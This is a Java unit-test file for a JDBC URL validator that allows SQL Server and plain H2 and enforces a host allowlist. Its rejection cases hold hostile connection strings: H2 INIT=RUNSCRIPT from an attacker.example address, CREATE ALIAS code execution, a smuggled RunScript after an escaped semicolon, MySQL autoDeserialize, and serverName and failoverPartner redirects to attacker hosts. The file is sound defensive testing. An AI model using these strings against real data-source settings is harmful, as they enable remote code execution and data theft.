package com.crisil.covenant.util;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.crisil.covenant.exception.ApiException;
import java.util.List;
import org.junit.jupiter.api.Test;

class JdbcUrlPolicyTest {

    @Test
    void acceptsSqlServerAndPlainH2() {
        assertThatCode(() -> JdbcUrlPolicy.requireSafe("jdbc:sqlserver://db:1433;databaseName=x"))
                .doesNotThrowAnyException();
        assertThatCode(() -> JdbcUrlPolicy.requireSafe("jdbc:h2:mem:test;MODE=MSSQLServer"))
                .doesNotThrowAnyException();
    }

    @Test
    void refusesOtherDriversAndH2InitScripts() {
        for (String url : new String[] {
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'",
            "JDBC:H2:mem:x;init=CREATE ALIAS EXEC AS 'x'",
            "jdbc:h2:mem:x;MODE=MSSQLServer\\;RunScript FROM 'x'",
            "jdbc:postgresql://db/x",
            "jdbc:mysql://db/x?autoDeserialize=true",
        }) {
            assertThatThrownBy(() -> JdbcUrlPolicy.requireSafe(url))
                    .isInstanceOf(ApiException.class)
                    .extracting("code").isEqualTo("DATA_SOURCE_JDBC_URL_INVALID");
        }
    }

    @Test
    void h2CanBeTurnedOffForSavedSources() {
        assertThatCode(() -> JdbcUrlPolicy.requireAllowed("jdbc:h2:mem:x", true)).doesNotThrowAnyException();
        assertThatCode(() -> JdbcUrlPolicy.requireAllowed("jdbc:sqlserver://db", false))
                .doesNotThrowAnyException();
        assertThatThrownBy(() -> JdbcUrlPolicy.requireAllowed("jdbc:h2:mem:x", false))
                .isInstanceOf(ApiException.class)
                .hasMessageContaining("not allowed");
    }

    @Test
    void findsEveryHostASqlServerUrlCanReach() {
        assertThat(JdbcUrlPolicy.sqlServerHosts("jdbc:sqlserver://db1:1433;databasename=x;encrypt=true"))
                .containsExactly("db1");
        assertThat(JdbcUrlPolicy.sqlServerHosts("jdbc:sqlserver://db1\\inst;failoverpartner=db2;flag"))
                .containsExactly("db1", "db2");
        assertThat(JdbcUrlPolicy.sqlServerHosts("jdbc:sqlserver://;servername=evil.example;databasename=x"))
                .containsExactly("evil.example");
        assertThat(JdbcUrlPolicy.sqlServerHosts("jdbc:sqlserver://;server = db3/path")).containsExactly("db3");
        assertThat(JdbcUrlPolicy.sqlServerHosts("jdbc:sqlserver://")).isEmpty();
    }

    @Test
    void sqlServerHostsMustBeAllowlisted() {
        List<String> allowed = List.of("DB1", " db2 ");
        assertThatCode(() -> JdbcUrlPolicy.requireAllowedHost("jdbc:sqlserver://db1:1433;failoverPartner=db2", allowed))
                .doesNotThrowAnyException();
        for (String url : new String[] {
            "jdbc:sqlserver://attacker.example:1433",
            "jdbc:sqlserver://db1;serverName=attacker.example",
            "jdbc:sqlserver://db1;failoverPartner=attacker.example",
        }) {
            assertThatThrownBy(() -> JdbcUrlPolicy.requireAllowedHost(url, allowed))
                    .isInstanceOf(ApiException.class)
                    .extracting("code").isEqualTo("DATA_SOURCE_HOST_NOT_ALLOWED");
        }
        assertThatThrownBy(() -> JdbcUrlPolicy.requireAllowedHost("jdbc:sqlserver://;databaseName=x", allowed))
                .hasMessageContaining("names no server");
        assertThatThrownBy(() -> JdbcUrlPolicy.requireAllowedHost("jdbc:sqlserver://db1", List.of()))
                .extracting("code").isEqualTo("DATA_SOURCE_HOST_NOT_ALLOWED");
    }

    @Test
    void wildcardAndH2SkipTheHostCheck() {
        assertThatCode(() -> JdbcUrlPolicy.requireAllowedHost("jdbc:sqlserver://anything", List.of("*")))
                .doesNotThrowAnyException();
        assertThatCode(() -> JdbcUrlPolicy.requireAllowedHost("jdbc:h2:mem:x", List.of()))
                .doesNotThrowAnyException();
    }
}
